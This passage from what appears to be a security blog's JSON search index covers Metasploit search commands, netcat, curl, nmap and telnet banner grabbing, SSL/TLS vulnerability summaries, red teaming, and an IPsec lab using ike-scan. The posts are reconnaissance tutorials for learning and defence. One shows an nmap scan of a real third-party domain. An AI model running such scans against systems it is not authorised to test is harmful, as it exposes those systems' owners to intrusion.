a CSV::rubysearch type:exploit cve:2017 platform:-windows port:80 rank:excellent check -o /tmp/output.csv[*] Wrote search results to /tmp/output.csvExport to CSVAnother example where we search for all Metasploit modules of type exploit, for the Windows platform and operate on port 445 (SMB). We then specify the ‘check’ column as the search column meaning the exploits will be sorted by those that have a ‘check’ option first and then we output the result to CSV.::rubysearch type:exploit platform:windows port:445 -s check -o /tmp/windows-smb.csvLastly, what if we wanted to perform a search and then export that search to a CSV file as a oneliner without remaining in the Metasploit console.msfconsole -qx 'search type:exploit platform:windows port:445 -o /tmp/win-smb.csv;exit'" }, { "title": "Banner Grabbing Introduction", "url": "/posts/banner-grabbing-introduction/", "categories": "tutorial", "tags": "banner-grabbing, enumeration", "date": "2022-01-11 00:00:00 +0000", "snippet": "NetcatBy sending the following HTTP request via:nc 192.168.0.10 80 GET / HTTP/1.1 Host: vulnerable &lt;enter&gt; &lt;enter&gt;Saving Banners to a file and parsing in input to ncat rather than typ...", "content": "NetcatBy sending the following HTTP request via:nc 192.168.0.10 80 GET / HTTP/1.1 Host: vulnerable &lt;enter&gt; &lt;enter&gt;Saving Banners to a file and parsing in input to ncat rather than typingecho \"GET / HTTP/1.1\" &gt; input.txtecho \"\" &gt;&gt; input.txtecho \"\" &gt;&gt; input.txtnc -nvv -o banners.txt 192.168.0.10 80 &lt; input.txtIt is possible to retrieve information on the version of PHP and the web server used just by observing the HTTP headers sent back by the server:HTTP/1.1 200 OK Date: Thu, 24 Nov 2011 04:40:51 GMT Server: Apache/2.2.16 (Debian) X-Powered-By: PHP/5.3.3-7+squeeze3 Vary: Accept-Encoding Content-Length: 1335 Content-Type: text/html We can try a banner grab with a spoofed User Agent Browsernc 192.168.0.10 80 GET / HTTP/1.1 Host: 192.168.0.10 User-Agent: SPOOFED-BROWSER Referrer: K0NSP1RACY.COM &lt;enter&gt; &lt;enter&gt;HTTPSIf the application was only available via HTTPS, telnet or netcat would not be able to communicate with the server, the tool openssl can be used:root@kali:~/# openssl s_client -connect vulnerable:443 Curlroot@root:/# curl -I domain.co.ukHTTP/1.1 200 OKDate: Wed, 05 Apr 2017 20:26:26 GMTServer: Apache/2.4.23 (Unix)X-Powered-By: PHP/5.4.45Expires: Thu, 19 Nov 1981 08:52:00 GMTCache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0Pragma: no-cacheSet-Cookie: PHPSESSID=cfn55sh9vqnr0dm55go05a2852; path=/X-Hostname: sweb14Content-Type: text/html; charset=UTF-8NMAProot@evilsaint:/# nmap -sV -p 80 --script=banner yahoo.co.ukStarting Nmap 7.40 ( https://nmap.org ) at 2017-04-05 21:32 BSTNmap scan report for yahoo.co.uk (217.12.15.37)Host is up (0.0052s latency).Other addresses for yahoo.co.uk (not scanned): 72.30.203.4 206.190.42.177PORT STATE SERVICE VERSION80/tcp open http-proxy Apache Traffic Server|_http-server-header: ATSService Info: Host: media-router-rc3.prod.media.ir2.yahoo.comService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 23.35 secondsTelnetBanner Grab FTPtelnet ip_address 21Banner Grab SSHtelnet ip_address 22Banner Grab Telnettelnet ip_address Banner Grab HTTProot@root:/# telnet domain.co.uk 80Trying 46.32.240.39...Connected to domain.co.uk.Escape character is '^]'.GET / HTTP/1.1HTTP/1.1 400 Bad RequestDate: Wed, 05 Apr 2017 20:50:08 GMTServer: Apache/2.4.23 (Unix)Content-Length: 303Content-Type: text/html; charset=iso-8859-1" }, { "title": "Vulnerabilities in SSL & TLS :- Logjam", "url": "/posts/vulnerabilities-ssl-tls-logjam/", "categories": "article", "tags": "logjam, ssl, tls", "date": "2022-01-10 00:00:00 +0000", "snippet": "Main Points For this attack to work, the attacker must use a different exploit to become a person-in-the-middle and inject content into the network traffic stream. Very similar to FREAK except th...", "content": "Main Points For this attack to work, the attacker must use a different exploit to become a person-in-the-middle and inject content into the network traffic stream. Very similar to FREAK except this time, Diffie-Hellman is used instead of RSA. Diffie-Hellman key exchange is a popular cryptographic algorithm that allows Internet protocols to agree on a shared key and negotiate a secure connection. It is essential to many protocols, including HTTPS, SSH, IPsec, SMTPS, and those that rely on TLS. The Logjam vulnerability allows a person-in-the-middle attacker to downgrade vulnerable TLS connections to 512-bit export-grade cryptography.Quick ReferenceDescriptionThe SSL Logjam vulnerability allows attackers within person-in-the-middle context to exposes Export Grade cipher suites to downgrade TLS connections.NameLogjamCVE NumberClosest thing to an official CVE number is CVE-2015-4000.Type of VulnerabilityMethod for attacking Die-Hellman (DH) key exchangeAffectedThe TLS protocol 1.2 and earlier when a DHE_EXPORT cipher suite is enabled.RemediationDisable support for export cipher suites and use a 2048-bit Diffie-Hellman group." }, { "title": "Vulnerabilities in SSL & TLS :- FREAK", "url": "/posts/vulnerabilities-ssl-tls-freak/", "categories": "article", "tags": "freak, ssl, tls", "date": "2022-01-09 00:00:00 +0000", "snippet": "Main Points In the 1990s, the US government established rules governing the strength of encryption that could be exported (“Export keys”). In any Secure Socket Layer (SSL) implementations aimed a...", "content": "Main Points In the 1990s, the US government established rules governing the strength of encryption that could be exported (“Export keys”). In any Secure Socket Layer (SSL) implementations aimed at export, these rules limited the strength of the RSA encryption keys to a maximum of 512 bits. The RSA Export keys were designed to allow exports to contain encryption that could not be broken by a typical computing resource but could be broken by the NSA. For this attack to work, the attacker must use a different exploit to become a person-in-the-middle and inject content into the network traffic stream. The FREAK attack necessitates a person-in-the-middle position in order to change the initial HTTP packet that is sent out when negotiating cipher use to request “Export Keys.” The use of “Export Keys” suites was stopped, and by the year 2000, browsers could use a higher-security SSL. Attack Narrative An attacker gains a person-in-the-middle position between two computers. Victim requests a secure connection to a webpage. The victims browser sends a “Client Hello message” to the server asking for typical cipher suites. The attacker intercepts the conversation and substitutes the requested cipher suites with a request for ‘export RSA’ The server agrees and accepts the request (not understanding that it was modified). It responds with a 512-bit export RSA key. The client accepts ‘export RSA’ (not understanding that its request was modified). Attacker breaks weaker keys (first done by a researcher in 1999, modern cloud computing makes this much easier) and obtains information. Quick ReferenceAbbreviationFREAKNameFactoring RSA Export KeysCVE NumberCVE-2015-0204Type of VulnerabilityThe vulnerability is in the ciphers with which the system is willing to communicate. They cannot be negotiated if the weak cipher is removed. It is a simple fix.AffectedAny system willing to negotiate RSA Export Keys.RemediationDisable support for weak export-grade ciphersMediationRemove any weak ciphers from your configuration. Refuse to communicate using weak ciphers. This way the person-in-the-middle cipher negotiation cannot be modified to support RSA Export Keys." }, { "title": "Vulnerabilities in SSL & TLS :- DROWN", "url": "/posts/vulnerabilities-ssl-tls-drown/", "categories": "article", "tags": "drown, ssl, tls", "date": "2022-01-08 00:00:00 +0000", "snippet": "Main Points For this attack to work, the attacker must use a different exploit to become a person-in-the-middle and inject content into the network traffic stream. At the time of public disclosur...", "content": "Main Points For this attack to work, the attacker must use a different exploit to become a person-in-the-middle and inject content into the network traffic stream. At the time of public disclosure on March 2016, it was indicated 33% of all HTTPS servers were vulnerable to the attack. At the time of the public disclosure in March 2016, it was estimated that 33% of all HTTPS servers were vulnerable to the attack. Takes hours to retrieve data unless a specific version of OpenSSL is used, which is known to allow for a one minute average decryption rate rather than a four hour average decryption rate. Another attack that relies on export grade cryptography; introduced to comply with US government restrictions in the 1990s. DROWN demonstrates that simply allowing SSLv2, even if no legitimate clients use it, poses a risk to modern servers and clients. It allows an attacker to decrypt modern TLS connections between up-to-date clients and servers by sending probes to any server that supports SSLv2 and uses the same private key. At the time of publication (August 2016), the team behind the paper “DROWN: Breaking TLS Using SSLv2” was able to attack and decrypt a TLS 1.2 handshake using 2048-bit RSA in under eight hours, at a cost of $440 on Amazon EC2.Quick ReferenceDescriptionDecrypting RSA with Obsolete and Weakened eNcryption (DROWN) is an attack that demonstrates that even if you do not allow SSLv2, simply supporting it can be dangerous. It allows an attacker to decrypt TLS connections between clients and servers.AbbreviationDROWNNameDecrypting RSA with Obsolete and Weakened eNcryptionCVE NumberCVE-2016-0800Type of VulnerabilityWithin the SSL v2.0 protocol when paired with export grade ciphers.AffectedTwo types of systems are vulnerable. A system supporting SSLv2. (Systems that support SSLv2 negotiation are still surprisingly common!) A system that uses its private key on any other server that allows SSLv2 connections, even if it is for a different protocol. TLS, for example, is another protocol. The original system is vulnerable as long as SSLv2 can be negotiated on the second system.RemediationRemove support for SSL v2, and best practises would suggest removing anything older than TLS 1.1. TLS 1.0 does not need to be supported.Even if you are confident that you have disabled SSLv2 on your HTTPS server, you could be reusing your private key on another server (such as an email server) that does support SSLv2. We recommend manually inspecting all servers that use your private key." }, { "title": "What is a Red Team?", "url": "/posts/what-red-team/", "categories": "article", "tags": "penetration-testing, red-teaming", "date": "2022-01-07 00:00:00 +0000", "snippet": "What is red teaming?The term “Red Teaming” is frequently used in the realm of cyber security. Its meaning has evolved over time due to a variety of factors, including vendors misusing the term in m...", "content": "What is red teaming?The term “Red Teaming” is frequently used in the realm of cyber security. Its meaning has evolved over time due to a variety of factors, including vendors misusing the term in marketing and a misunderstanding of compliance requirements.As a foundation for the course content, I will make an effort to provide an accurate definition of red teams - what they are, what they do, and why they do it (and perhaps just as importantly, what they are not).A good dictionary definition is provided by Joe Vest and James Tubberville: Red Teaming is the process of using tactics, techniques and procedures (TTPs) to emulate a real-world threat, with the goal of measuring the effectiveness of the people, processes and technologies used to defend an environment.What are the benefits of red teaming?Red teams offer an adversarial viewpoint by attacking an organisation’s and defenders’ assumptions.Assumptions like “We are secure because we patch,” “Only X number of people can access that system,” and “Technology Y would stop that” are dangerous and frequently fail to hold up to scrutiny. A red team can identify areas for improvement in an organisation’s operational defence by challenging these assumptions.Penetration testing vs. red teamingEven though there is some overlap with penetration testing, I’d like to highlight some key differences.A typical penetration test will focus on a single technology stack, either because it is part of the project lifecycle or as a compliance requirement, (e.g. monthly or annual assessments). The objectives are to identify as many vulnerabilities as possible, demonstrate how those vulnerabilities can be exploited, and provide some contextual risk ratings. The output is usually a report detailing each vulnerability and remediation action, such as installing a patch or reconfiguring some software. There is no explicit focus on detection or response, no assessment of people or processes, and no specific goal other than “exploit the system(s).”In contrast, red teams have a clear objective defined by the organisation - whether that be to gain access to a particular system, email account, database or file share. After all, organisations are defending “something,” and jeopardising the confidentiality, integrity, and/or availability of that “something” represents a real risk, whether financial or reputational. A red team will also emulate a real-life threat to the organisation.For example, a finance company may be at risk from known FIN groups. In the case of a penetration test, a tester will simply use their personal preferred TTPs, whereas a red team will study and re-use (where appropriate) the TTPs of the threat being simulated. This enables the organisation to develop detections and processes to combat the specific threat(s) they expect to face. Red teams will also look holistically at an organisation’s overall security posture rather than being laser-focused on one specific area; This includes people, processes, and technology, of course.Finally, red teams put a heavy emphasis on stealth and the “principal of least privilege”. To challenge the detection and response capabilities, red teamers must complete their objective without being detected. A part of this includes not pursuing high-privileged accounts (such as Domain Admin) unnecessarily; If “Bob from Accounting” can access the objective, then that will do.Breach ModelThe breach model outlines how the red team intends to gain access to the target environment. This is typically accomplished by attempting to gain access in accordance with the threat (for example, via OSINT and phishing); Or by the organisation providing the access (often called “assume breach”).There are pros and cons for each approach depending on the objective(s) of the assessment.If no assume breach is chosen and the red team attempts to gain access, it is essential to have a contingency plan in place in the event that access is not gained within the predetermined time period. A possible compromise is to revert to an assume breach model if the team does not gain access within the first 25% of the engagement timeframe. This is critical because red team assessments are more concerned with detection and response than with prevention, and thus those aspects of the assessment are more critical than attempting to “prove” that a breach can occur in the first place.Notifications and announcementsRed team assessments are often arranged by upper management in security or compliance roles, and they face a choice as to whether to notify the entire organisation or a subset of it about an upcoming engagement. They may choose to inform nobody, everyone, or only the appropriate security/support teams.Not providing any notification allows everyone to react as they would on any given day, which results in the most authentic outcomes. However, security teams may feel as though they are being tested or not trusted by management, which can result in strained relationships and negative outcomes.On the other hand, prior notification may cause security teams to be extra vigilant or to temporarily increase security measures, which does not reflect their normal security posture.Ultimately, the “correct” decision should come down to the existing culture and relationships within the organisation." }, { "title": "Vulnerabilities in SSL & TLS :- Sweet32", "url": "/posts/vulnerabilities-ssl-tls-sweet32/", "categories": "article", "tags": "ssl, sweet32, tls", "date": "2022-01-07 00:00:00 +0000", "snippet": "Main Points Sweet32 takes advantage of weaknesses in the design of some ciphers. Allows an attacker to recover small portions of plaintext encrypted with 64-bit block ciphers (such as Triple-DES ...", "content": "Main Points Sweet32 takes advantage of weaknesses in the design of some ciphers. Allows an attacker to recover small portions of plaintext encrypted with 64-bit block ciphers (such as Triple-DES and Blowfish). Based on the use of legacy block ciphers, which are vulnerable to a practical collision attack when used in CBC mode. A simple birthday attack can be used to identify 64-bit block cipher collisions when using the CBC mode of operation. When a collision occurs, it means that the input and output are the same, allowing the encrypted data to be exfiltrated. The use of a 64-bit block ciphers is likely to produce a collision after 32 GB of data, but for a practical attack the researchers found that up to 785 GB of data is required. A specific weakness in the OpenSSL implementation of SSLv2 allows for a ‘special DROWN attack,’ which greatly reduces the effort required to break the encryption, allowing for real-time person-in-the-middle attacks.Quick ReferenceDescriptionThe attack which involves collecting SSL traffic using legacy block ciphers via a person-in-the-middle context and subjecting it to a collision attack.AbbreviationSWEET32NameSWEET32CVE NumberCVE-2016–2183 and CVE-2016–6329Type of VulnerabilityThe attack takes advantage of flaws in the design of some block ciphers.AffectedCarrying out the TLS variant of the Sweet32 attack successfully requires a very specific set of capabilities on the part of the attacker: The attacker must be able to run JavaScript in the victim’s browser to generate data for transmission to the server. The attacker must keep the victim on the malicious JavaScript page for one to two days to generate enough ciphertext blocks to find a collision.RemediationDo not support or negotiate 3DES cipher-suites. At a minimum, AES should be preferred over 3DES. Limit the length of the TLS session." }, { "title": "Vulnerabilities in SSL & TLS :- Heartbleed", "url": "/posts/vulnerabilities-ssl-tls-heartbleed/", "categories": "article", "tags": "heartbleed, openssl, ssl, tls", "date": "2022-01-06 00:00:00 +0000", "snippet": "Main Points Does not require a person-in-the-middle position to work – unlike many other attacks in our “Vulnerabilities in SSL/TLS” series. Found in OpenSSL’s implementation of the SSL/TLS proto...", "content": "Main Points Does not require a person-in-the-middle position to work – unlike many other attacks in our “Vulnerabilities in SSL/TLS” series. Found in OpenSSL’s implementation of the SSL/TLS protocol – rather than the protocol itself or one of its components. OpenSSL 1.0.1 added a “Heartbeat” extension in December 2011 whose goal was to avoid the need to re-establish SSL sessions and extend their lifespan. Later, a flaw was introduced into the Hearbeat extension’s code. Apache and Nginx power much of the internet’s infrastructure and by default use OpenSSL. Some sources claim that at the time of the Heartbleed attack, 17% of the internet was vulnerable. Heartbleed is a programming error. The TLS heartbeat extension lacks a bounds check, causing incorrect input validation. The extension returns memory contents without checking how much is returned. PHD Student Robin Seggelmann, co-author of the Heartbeat extensions RFC, introduced the bug into the code. Stephen N. Henson, one of OpenSSL’s four core developers, reviewed the code. Henson overlooked a flaw in Seggelmann’s implementation, which was introduced into OpenSSL’s source code repository on December 31, 2011. The flaw spread rapidly with the release of OpenSSL 1.0.1 on March 14, 2012, with Heartbeat support enabled by default. 1.0.1g, released on April 7, 2014. Affects either a server or a client using a vulnerable OpenSSL TLS instance.Quick ReferenceAbbreviationNo abbreviation, just referred to as Heartbleed.NameHeartbleedCVE NumberCVE-2014-0160Where is VulnerabilityThe vulnerability is in the OpenSSL implementation of SSL/TLS and not the SSL/TLS protocol itself.AffectedOnly 1.0.1 and 1.0.2-beta releases of OpenSSL are affected including 1.0.1f and 1.0.2-beta1.RemediationAs long as the vulnerable version of OpenSSL is in use, it can be abused. Upgrade to a patched version of OpenSSL." }, { "title": "IP Sec - Introduction Part 2", "url": "/posts/ip-sec-introduction-part-2/", "categories": "article", "tags": "ike, isakmp", "date": "2022-01-04 00:00:00 +0000", "snippet": "Let us go over a summary of the points we covered in the introduction. IKE is an implementation of the Internet Security Association Key Management Protocol (ISAKMP) along with the use of Oakley a...", "content": "Let us go over a summary of the points we covered in the introduction. IKE is an implementation of the Internet Security Association Key Management Protocol (ISAKMP) along with the use of Oakley and SKEME protocols. IKE communicates through UDP port 500. IKE authentication methods support pre-shared keys, public-key encryption, and digital signatures. IKE uses a two-phase process to establish the IPsec SA. IKE phase one authenticates the peers who establish an ISAKMP SA, which is used during Phase two. The second Phase establishes an IPsec SA; IKE phase one can run in two modes, “main mode” or “aggressive mode”. Phase two only has a single mode called Quick mode.Phase one, as mentioned, can be run in two modes called “main mode” or “aggressive mode”. When testing IPsec VPN systems, we will primarily be dealing with IKE phase one as Phase two is only accessible upon successful authentication.“main mode” or “aggressive mode”Main Mode Six messages are sent in total. The expensive DH computation is not performed until after the first packet is exchanged, and the peer IDs are passed encrypted not in the clear. Due to the way it is calculated, it is not possible to use the “main mode” with pre-shared key authentication unless the IP address of the initiator (client) is known beforehand. Client IPs are usually dynamic in remote access situations.Aggressive mode Optional, so not all VPN services will support it. Only three messages are sent in instead of the six used in “main mode”, which reduces the time required to complete Phase one exchange, but it impacts security integrity because the peer ID is passed in the clear, not encrypted. This mode is generally used in a remote access VPN solution. Aggressive mode is susceptible to resource exhaustion because the expensive DH computation must be performed immediately after receiving the first packet.Configuring IPSecLab Nine in La Maison de saint is the following setup: a Windows Server 2016 and a Windows 10, 64-bit operating system. It can be seen in the screenshot that both machines have non-persistent hard disks and have their operating system build numbers in their title. They are both set up on their own VM Net Number. 💡 Note, the benefit of non-persistent disks is that they will maintain the configuration if the machine is rebooted. However, if the machine is shut down, it will revert to its previous configuration when turned back on. Initial configuration if we look at the above screenshots, we can identify the two machines’ hostname and IP address. The windows 10 machine is called “client”, and the Windows Server machine is called “server”. These are on IP 10.10.10.100 and 10.10.10.250There is an IIS default web application on port 80 of the server that we will connect to test the IP Sec configuration. The below screenshot shows the connection to the web application and a blend of TCP and HTTP traffic showing up in Wireshark.Wireshark open and HTTP traffic showing. Web application (IIS default start page)Let us navigate to the start menu and open “Windows Firewall with Advanced Security”. We will open the Windows Firewall with Advanced Security, select Connect security policy from the left-hand side, and create a new rule on the right-hand side. In the modal that appears, we will have five different rule options. Isolation Authentication exemption server-to-server Tunnel CustomWe will configure a server to server connection. It will then ask us for the endpoints; we can select the two endpoints per the IP Addresses mentioned earlier. On the next screen, we are asked several options regarding whether we want to require or request authentication for inbound and outbound scenarios. We want to request authentication for inbound and outbound connections, but we will not require it for communication (It is nice to have, desired but not enforced). On the following screen, we can set up an authentication method. As mentioned previously, we can see computer certificates as one of the authentication options. If we select the Advanced option and click customise, we will be taken to a screen to configure a customised advanced authentication method. In this case, we will click to add the first authentication method and select the pre-shared key. Pre-Shared Keys (as you can see from the warning) are not recommended; however, they are the easiest way to set up the configuration for our lab.We will then click OK and OK again, then select next to move on to the next screen. We will apply this rule to all types of networks, domain, private and public. We will now refresh our browser connection and look inside Wireshark. Packets 61 and 62 show are initial connection on TCP port 80 and then shortly after we can now see the six packets that make up the “main mode” and the following “quick mode” packets.Because we have set up a secure connection between two endpoints, as shown in the following screenshots, we will not gain an IKE handshake as our testing machine cannot fall in the endpoint IP range.However, if we set the endpoint range to be any in the following range, and we happen to be inside that range, then we might get some output that we can see from our penetration testing tools. Using Ike-ScanWe can identify IPsec VPN points with Ike-Scan.If we run ike-scan against our server with no arguments you can see if has negotiated a handshake and we can see the details of the SAsudo ike-scan 10.10.10.250Starting ike-scan 1.9.4 with 1 hosts ([http://www.nta-monitor.com/tools/ike-scan/](http://www.nta-monitor.com/tools/ike-scan/))10.10.10.250 Main Mode Handshake returned HDR=(CKY-R=0cf85f1d8b3df6a4) SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration(4)=0x00007080) VID=1e2b516905991c7d7c96fcbfb587e46100000009 (Windows-8) VID=4a131c81070358455c5728f20e95452f (RFC 3947 NAT-T) VID=90cb80913ebb696e086381b5ec427b1f (draft-ietf-ipsec-nat-t-ike-02\\n) VID=4048b7d56ebce88525e7de7f00d6c2d3 (IKE Fragmentation) VID=fb1de3cdf341b7ea16b7e5be0855f120 (MS-Negotiation Discovery Capable) VID=e3a5966a76379fe707228231e5ce8652 (IKE CGA version 1)Ending ike-scan 1.9.4: 1 hosts scanned in 0.008 seconds (129.87 hosts/sec). 1 returned handshake; 0 returned notifyFor clarity we can add the -M option for multi-line mode to make it easier to read.sudo ike-scan 10.10.10.250 -M Starting ike-scan 1.9.4 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)10.10.10.250 Main Mode Handshake returned HDR=(CKY-R=eb5de8bbb1bcb7d6) SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration(4)=0x00007080) VID=1e2b516905991c7d7c96fcbfb587e46100000009 (Windows-8) VID=4a131c81070358455c5728f20e95452f (RFC 3947 NAT-T) VID=90cb80913ebb696e086381b5ec427b1f (draft-ietf-ipsec-nat-t-ike-02\\n) VID=4048b7d56ebce88525e7de7f00d6c2d3 (IKE Fragmentation) VID=fb1de3cdf341b7ea16b7e5be0855f120 (MS-Negotiation Discovery Capable) VID=e3a5966a76379fe707228231e5ce8652 (IKE CGA version 1)Ending ike-scan 1.9.4: 1 hosts scanned in 0.008 seconds (120.63 hosts/sec). 1 returned handshake; 0 returned notifyIf we just want to check the mode i.e. Main or Aggressive then we might want to use the --quiet flag to get rid of any superfluous SA information.sudo ike-scan 10.10.10.250 --quietStarting ike-scan 1.9.4 with 1 hosts ([http://www.nta-monitor.com/tools/ike-scan/](http://www.nta-monitor.com/tools/ike-scan/))10.10.10.250 Main Mode Handshake returnedEnding ike-scan 1.9.4: 1 hosts scanned in 0.007 seconds (151.15 hosts/sec). 1 returned handshake; 0 returned notifyIn this example we have been fortunate to be able to negotiate an SA. However on another endpoint we might not be so successful. We can use the --trans flag to specify values that make up a custom transform.sudo ike-scan 10.10.10.250 -M -v --trans=5,2,1,2DEBUG: pkt len=84 bytes, bandwidth=56000 bps, int=16000 usStarting ike-scan 1.9.4 with 1 hosts ([http://www.nta-monitor.com/tools/ike-scan/](http://www.nta-monitor.com/tools/ike-scan/))10.10.10.250 Main Mode Handshake returnedHDR=(CKY-R=581954ce022c82e2)SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration(4)=0x00007080)VID=1e2b516905991c7d7c96fcbfb587e46100000009 (Windows-8)VID=4a131c81070358455c5728f20e95452f (RFC 3947 NAT-T)VID=90cb80913ebb696e086381b5ec427b1f (draft-ietf-ipsec-nat-t-ike-02\\n)VID=4048b7d56ebce88525e7de7f00d6c2d3 (IKE Fragmentation)VID=fb1de3cdf341b7ea16b7e5be0855f120 (MS-Negotiation Discovery Capable)VID=e3a5966a76379fe707228231e5ce8652 (IKE CGA version 1)Ending ike-scan 1.9.4: 1 hosts scanned in 0.007 seconds (135.19 hosts/sec). 1 returned handshake; 0 returned notifyWe can lookup the values belowEncryption Algorithm Values1 = DES2 = IDEA3 = Blowfish4 = RC55 = Triple DES6 = CAST7 = AES8 = CamelliaHash Algorithm Values1 = MD52 = SHA13 = Tiger4 = SHA2-2565 = SHA2-3846 = SHA2-512Authentication Method Values1\t\t= Pre-Shared Key2\t\t= DSS Signature3\t\t= RSA Signature4\t\t= RSA Encryption5\t\t= Revised RSA Encryption6\t\t= ElGamel Encryption7\t\t= Revised ElGamel Encryption8\t\t= ECDSA Signature64221\t= Hybrid Mode65001\t= XAUTHDiffie-Hellman Group Values1\t= MODP 7682\t= MODP 10243\t= EC2N 1554\t= EC2N 1855\t= MODP 15366\t= EC2N 1637\t= EC2N 1638\t= EC2N 1839\t= EC2N 18310\t= EC2N 40911\t= EC2N 40912\t= EC2N 57113\t= EC2N 57114\t= MODP 204815\t= MODP 307216\t= MODP 409617\t= MODP 614418\t= MODP 8192" }, { "title": "IP Sec - Introduction", "url": "/posts/ip-sec-introduction/", "categories": "article", "tags": "ike, isakmp", "date": "2022-01-03 00:00:00 +0000", "snippet": "IPSec OverviewIPSec is a framework of open standards. The benefit of being a framework is that if one component gets superseded, it can be replaced, or additional items can be added. The suite of p...", "content": "IPSec OverviewIPSec is a framework of open standards. The benefit of being a framework is that if one component gets superseded, it can be replaced, or additional items can be added. The suite of protocols that make up IPSec allows secure, encrypted communication between two computers.Uses of IPsec Authenticating and encrypting host-to-host traffic. Authenticating and encrypting traffic to specific servers. Using L2TP/IPsec for VPN connections. Site-to-site tunneling. Enforcing logical networks.OverviewIPSec was designed to provide security options and enhancements to Internet Protocol (IP) and negate Internet Protocol weaknesses.IPsec provided the following security. Authentication - IP spoofing and packet source forgery issues. Data Integrity - Modification of data within IP packets. Anti-replay - Replaying packet attacks. Data Confidentiality - Prevent packet sniffing attacks.IPSec consists of three core components. IKE, ESP and AH.Internet Key Exchange (IKE) is a network security Protocol designed to allow two devices to dynamically exchange Encryption Keys and negotiate Security Associations (SA). Internet Key Exchange (IKE) Security Associations (SA) can be established dynamically and removed after a negotiated period.Encapsulating Security Payload (ESP) provides IPSec data integrity, encryption, authentication, and anti-replay functions. ESP authenticates the data within the VPN, ensuring the integrity of the data and that it is coming from the correct source. Encapsulating Security Payload can provide encryption via two modes. Transport mode and Tunnel mode. In transport mode, the payload is encrypted, and in tunnel mode, the entire packet is encrypted.Authentication Header (AH) provides data integrity, authentication, and anti-replay functions for IPSec. Authentication Header (AH) does not, however, provide any data encryption. Authentication Header (AH) is used to provide data integrity services to ensure that no data tampering has occurred during transmission.So just to run that back again, the authentication header (AH) is concerned with ensuring that packets get delivered and maintain their integrity. It will block against replay attacks and make sure data has not been modified; however, it does not encrypt. Encapsulating Security Payload (if used) encapsulates and encrypts the IP datagrams to protect them from sniffing attacks in addition to what AH does alone.💡 Why would we ever use AH if ESP does everything? In short, when overhead and packet size becomes issues. ESP encapsulates packets with much overhead.A look at IKE and ISAKMPIKE or Internet Key Exchange protocol is a protocol that sets up Security Associations (SAs) in the IPSec protocol suite.Internet Key Exchange (IKE) is a hybrid protocol that consists of 3 protocols. ISAKMP: It is not a key exchange protocol per se. It is a framework on which key exchange protocols operate. Oakley: Describes the “modes” of key exchange (e.g. perfect forward secrecy for keys, identity protection, and authentication) SKEME: Provides support for public-key-based Key exchange, key distribution centres, and manual installation. It also outlines methods of secure and fast key refreshment.In many texts, the terms IKE and ISAKMP are used interchangeably, which often confuses people in picking up this topic. Although we have briefly touched on their relationship, let us clarify the difference between IKE and ISAKMP.Internet Security Association Key Management Protocol (ISAKMP) is a framework for authentication and key exchange between two peers to establish, modify, and tear down SAs. It is designed to support many different kinds of key exchanges, not just IKE. ISAKMP uses UDP port 500 for communication between peers and is why port 500 is commonly associated with IPSec VPN.IKE is the implementation of ISAKMP using the Oakley and Skeme key exchange techniques. Oakley provides perfect forward secrecy (PFS) for keys, identity protection, and authentication; Skeme provides anonymity, reputability, and quick key refreshment.Think of ISAKMP as a framework, and IKE is an implementation of ISAKMP using the Oakley and Skeme key exchange techniques. Oakley provides perfect forward secrecy (PFS) for keys, identity protection, and authentication; Skeme provides anonymity, reputability, and quick key refreshment.Establishing an IPSec tunnel requires two IKE phases.IKE PhasesIPsec VPNs are negotiated in phases Successful Phase I negotiation results in an IKE Security Association (SA) Successful Phase II negotiation results in two separate IPsec SAs for the directions in and out. Phase II or (Quick Mode) happens through the Phase I tunnel.Phase I This Phase is where the IKE SA (Internet Key Exchange Security Association) is negotiated. This Phase can be performed in one of two Modes: Main (MM) or Aggressive (AM)Phase II This Phase is where the IPSec SA is negotiated. The IPSec tunnel (also called the IKE Phase II tunnel) build is complete when this Phase is completed. This Phase only has one mode called Quick Mode.IPSec ImplementationMost IPsec implementations use the Internet Key Exchange (IKE) service. Some older IPsec implementations use manual keying (Which involves exchanging encryption and authentication keys in advance), but this is now considered obsolete. As discussed briefly in the introduction, the Internet Key Exchange (IKE) protocol is used to negotiate the cryptographic algorithm choices and generate the associated keys. The Authentication Header (AH) and Encapsulating Security Payload (ESP) then use these choices.The Internet Security Association and Key Management Protocol (ISAKMP) provides the framework for establishing SAs. A security association (SA) is a logical connection involving two devices that transfer data. With the help of the defined IPsec protocols, SAs offer data protection for unidirectional traffic. Generally, an IPsec tunnel features two unidirectional SAs, which offer a secure, full-duplex channel for data.A security association consists of parameters I remember as HAGLE:H = Hash AlgorithmA = Authentication MethodG = Group NumberL = Lifetime ValueE = EncryptionBoth sides store the SA parameters in their security Association database when complete, sometimes referenced as SAD." }, { "title": "Web Security Headers", "url": "/posts/web-security-headers/", "categories": "article", "tags": "browsers, content-security-policy, csp, hsts, security-headers, strict-transport-security, x-content-type-options, x-frame-options", "date": "2022-01-02 00:00:00 +0000", "snippet": "HTTP Headers are typically easy to implement and can significantly increase the security of your website and help prevent security vulnerabilities like Cross-Site Scripting, Clickjacking, Informati...", "content": "HTTP Headers are typically easy to implement and can significantly increase the security of your website and help prevent security vulnerabilities like Cross-Site Scripting, Clickjacking, Information disclosure and more. In this article, we are concerned chiefly with five security headers that can be implemented to improve the security posture of your website. X Frames Options X-Frames-Options XSS Protection X-XSS-Protection X Content-Type Options X-Content-Type-Options Strict Transport Security Header (HSTS) Strict-Transport-Security Content Security Policy (CSP) Content-Security-Policy While these headers are certainly not in order of importance, I have purposely left Security Headers with more discussion points until later in this article.A quick word on setting headers. While the exact location of a webservers domain configuration file can be customised, it is quite common for the Nginx and Apache Configuration files to be at the following locations named typically after the web domain name or utilising the default configuration example. If your website was something.com, then check for a file called something.com.conf or potentially default.conf if the default template file was used. /etc/apache2/sites-enabled/&lt;website name default&gt;.conf /etc/nginx/sites-enabled/&lt;website name default&gt;.conf file: X Frames Options - X-Frames-OptionsThe X-Frame-Options HTTP response header can be used to indicate whether or not a browser should be allowed to render a page in a &lt;frame&gt;, &lt;iframe&gt;, &lt;embed&gt; or &lt;object&gt;. Sites can use this to avoid clickjacking attacks by ensuring that their content is not embedded into other sites.There are three ways to configure X-Frame-Options:DENY: This will disable iframe features 